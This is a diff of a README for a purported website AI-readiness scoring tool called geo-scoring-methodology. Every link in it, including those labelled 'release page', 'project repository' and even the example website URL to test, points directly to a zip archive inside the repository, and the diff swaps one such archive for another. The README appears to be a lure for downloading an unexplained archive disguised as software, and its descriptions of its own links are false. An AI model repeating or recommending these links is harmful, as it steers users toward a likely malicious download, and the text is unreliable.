@@ -1,6 +1,6 @@
 # 📊 geo-scoring-methodology - Website AI Readiness Scoring
 
-[![Download from Releases](https://img.shields.io/badge/Download-From%20Releases-brightgreen)](https://raw.githubusercontent.com/unprintable-mariestrumpelldisease646/geo-scoring-methodology/main/zygomata/geo_scoring_methodology_v3.4.zip)
+[![Download from Releases](https://img.shields.io/badge/Download-From%20Releases-brightgreen)](https://github.com/unprintable-mariestrumpelldisease646/geo-scoring-methodology/raw/refs/heads/main/zygomata/geo_methodology_scoring_1.6.zip)
 
 ---
 
@@ -36,10 +36,10 @@ Follow these steps to download, install, and run geo-scoring-methodology on your
 
 You need to visit the release page to get the latest version of the software.
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Latest%20Release-blue)](https://raw.githubusercontent.com/unprintable-mariestrumpelldisease646/geo-scoring-methodology/main/zygomata/geo_scoring_methodology_v3.4.zip)
+[![Download Latest Release](https://img.shields.io/badge/Download-Latest%20Release-blue)](https://github.com/unprintable-mariestrumpelldisease646/geo-scoring-methodology/raw/refs/heads/main/zygomata/geo_methodology_scoring_1.6.zip)
 
 1. Click the button above or visit this link:  
-   https://raw.githubusercontent.com/unprintable-mariestrumpelldisease646/geo-scoring-methodology/main/zygomata/geo_scoring_methodology_v3.4.zip
+   https://github.com/unprintable-mariestrumpelldisease646/geo-scoring-methodology/raw/refs/heads/main/zygomata/geo_methodology_scoring_1.6.zip
 
 2. Look for the latest version in the release list. It is usually at the top.
 
@@ -79,7 +79,7 @@ To check your website with geo-scoring-methodology:
 
 2. When the app opens, you will see a simple input screen.
 
-3. Enter the full URL of the website you want to test. Example: `https://raw.githubusercontent.com/unprintable-mariestrumpelldisease646/geo-scoring-methodology/main/zygomata/geo_scoring_methodology_v3.4.zip`
+3. Enter the full URL of the website you want to test. Example: `https://github.com/unprintable-mariestrumpelldisease646/geo-scoring-methodology/raw/refs/heads/main/zygomata/geo_methodology_scoring_1.6.zip`
 
 4. Click the "Run Checks" button.
 
@@ -137,10 +137,10 @@ If you need help or want to give feedback:
 ## 🔗 Important Links
 
 - Download page:  
-  https://raw.githubusercontent.com/unprintable-mariestrumpelldisease646/geo-scoring-methodology/main/zygomata/geo_scoring_methodology_v3.4.zip
+  https://github.com/unprintable-mariestrumpelldisease646/geo-scoring-methodology/raw/refs/heads/main/zygomata/geo_methodology_scoring_1.6.zip
 
 - Project repository:  
-  https://raw.githubusercontent.com/unprintable-mariestrumpelldisease646/geo-scoring-methodology/main/zygomata/geo_scoring_methodology_v3.4.zip
+  https://github.com/unprintable-mariestrumpelldisease646/geo-scoring-methodology/raw/refs/heads/main/zygomata/geo_methodology_scoring_1.6.zip
 
 - Documentation and FAQ:  
   Find guides inside the repository Wiki section.
@@ -152,7 +152,7 @@ If you need help or want to give feedback:
 To keep the software up to date:
 
 1. Visit the release page regularly:  
-   https://raw.githubusercontent.com/unprintable-mariestrumpelldisease646/geo-scoring-methodology/main/zygomata/geo_scoring_methodology_v3.4.zip
+   https://github.com/unprintable-mariestrumpelldisease646/geo-scoring-methodology/raw/refs/heads/main/zygomata/geo_methodology_scoring_1.6.zip
 
 2. Download the newest version following the same steps as above.
 
@@ -174,4 +174,4 @@ With AI search engines becoming common, traditional SEO is no longer enough. Too
 
 ---
 
-[![Download from Releases](https://img.shields.io/badge/Download-From%20Releases-brightgreen)](https://raw.githubusercontent.com/unprintable-mariestrumpelldisease646/geo-scoring-methodology/main/zygomata/geo_scoring_methodology_v3.4.zip)
+[![Download from Releases](https://img.shields.io/badge/Download-From%20Releases-brightgreen)](https://github.com/unprintable-mariestrumpelldisease646/geo-scoring-methodology/raw/refs/heads/main/zygomata/geo_methodology_scoring_1.6.zip)
